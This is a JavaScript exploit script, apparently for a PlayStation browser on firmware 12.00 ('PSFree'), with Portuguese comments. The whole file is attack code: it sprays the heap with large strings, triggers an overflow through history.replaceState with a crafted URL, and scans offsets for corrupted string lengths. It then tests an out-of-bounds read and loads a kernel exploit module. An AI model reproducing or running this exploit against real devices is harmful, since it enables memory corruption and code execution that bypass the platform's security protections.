/* PSFree Modular: 1MB Dynamic Scanner (FW 12.00) 
   Strategy: Sliding Window attack on StringImpl Header
*/

import { Int } from './module/int64.mjs';
import { log, sleep } from './module/utils.mjs';

// --- CONFIGURAÇÃO DE ESCANEAMENTO ---
const START_OFFSET = 709520; // Ponto conhecido de DADOS
const END_OFFSET = 709400;   // Limite de recuo (segurança)
const STEP_SIZE = 8;         // Pulo de 8 em 8 bytes (Alinhamento 64-bit)

const OVERFLOW_AMT = 1024 * 64; 

// Tamanho Vencedor (1MB)
const TARGET_SIZE = 1024 * 1024; 
const PAYLOAD_SIZE = TARGET_SIZE - 24; 

var victims = [];

// ===========================================================================
// FUNÇÃO DE SPRAY (Mantida Fiel ao Sucesso 1MB)
// ===========================================================================
async function prepare_heap() {
    // 1. Criar String Base (8-bit)
    let rawBuffer = new Uint8Array(PAYLOAD_SIZE);
    rawBuffer.fill(0x42); // 'B'
    let decoder = new TextDecoder("utf-8");
    let baseString = decoder.decode(rawBuffer);

    victims = [];
    const SPRAY_COUNT = 60; // Quantidade ajustada para velocidade

    for(let i=0; i<SPRAY_COUNT; i++) {
        // Prefixo único
        let s = i + "_" + baseString.substring((i+"_").length);
        victims.push(s);
    }

    // 2. Criar Buracos
    for(let i=0; i<SPRAY_COUNT; i+=2) {
        victims[i] = null;
    }

    await forceGC();
}

// ===========================================================================
// FUNÇÃO DE GATILHO COM OFFSET VARIÁVEL
// ===========================================================================
async function trigger_exploit(offset) {
    try {
        let buffer = "A".repeat(offset);
        buffer += "\x01".repeat(OVERFLOW_AMT);
        
        history.replaceState({}, "scan", "/" + buffer);

        return check_corruption(offset);

    } catch(e) {
        // Ignora erros de memória durante o scan
        return 'ERR';
    }
}

// ===========================================================================
// CHECAGEM
// ===========================================================================
function check_corruption(current_off) {
    for(let i=1; i<victims.length; i+=2) {
        let s = victims[i];
        if(!s) continue;

        try {
            let err = new Error(s);
            let msg = err.message;

            // 1. RCE (Length Corrompido)
            if (msg.length !== PAYLOAD_SIZE) {
                log(`[!!!] JACKPOT !!! String ${i} Length: ${msg.length}`, 'green');
                log(`    Offset Vencedor: ${current_off}`, 'green');
                return { type: 'RCE', str: msg };
            }

            // 2. DADOS (Conteúdo Corrompido)
            if (msg.charCodeAt(0) !== 66) { // 'B'
                log(`[+] Hit DADOS at offset ${current_off}. Recuando...`, 'yellow');
                return { type: 'DATA' };
            }

        } catch(e) {}
    }
    return null;
}

async function forceGC() {
    try { new ArrayBuffer(50 * 1024 * 1024); } catch(e){}
    return new Promise(r => setTimeout(r, 400));
}

// ===========================================================================
// PÓS-EXPLORAÇÃO (Ativação das Bibliotecas)
// ===========================================================================
async function activate_exploit(corrupted_str) {
    log("--- ATIVANDO PRIMITIVAS DE LEITURA/ESCRITA ---");
    
    // Aqui testamos a leitura fora dos limites (OOB Read)
    // Se conseguirmos ler, importamos o Lapse
    try {
        // Tenta ler 1MB adiante
        let val = corrupted_str.charCodeAt(TARGET_SIZE + 100);
        log(`[+] OOB Read Test: 0x${val.toString(16)}`, 'green');
        
        log("[+] Loading Kernel Exploit (Lapse)...");
        import('./lapse.mjs');
    } catch(e) {
        log("[-] Erro ao usar a string corrompida: " + e.message);
    }
}

// ===========================================================================
// LOOP DE ESCANEAMENTO
// ===========================================================================
async function main() {
    log("=== PSFree 12.00 Modular Scanner ===");
    log(`Scanning offsets from ${START_OFFSET} down to ${END_OFFSET}...`);
    
    let current_off = START_OFFSET;

    // Loop de Varredura
    while (current_off >= END_OFFSET) {
        
        // Tenta 3 vezes em cada offset para garantir estabilidade do Heap
        let retry = 0;
        let foundData = false;

        while(retry < 3) {
            await prepare_heap();
            let result = await trigger_exploit(current_off);

            if (result && result.type === 'RCE') {
                await activate_exploit(result.str);
                return; // FIM DO JOGO (VITÓRIA)
            }

            if (result && result.type === 'DATA') {
                foundData = true;
                break; // Se achou dados, não precisa insistir nesse offset, tem que recuar
            }

            // Limpa para retry
            victims = [];
            await forceGC();
            retry++;
        }

        if (!foundData) {
            // Se falhou 3x no offset, apenas loga progresso discreto
            if (current_off % 32 === 0) log(`Scanning... ${current_off}`);
        }

        // Recua para o próximo candidato
        current_off -= STEP_SIZE;
        
        // Pequena pausa para o navegador não congelar
        await sleep(50);
    }
    
    log("[-] Scan finished. No RCE found. Reboot and retry.", 'red');
}

main();
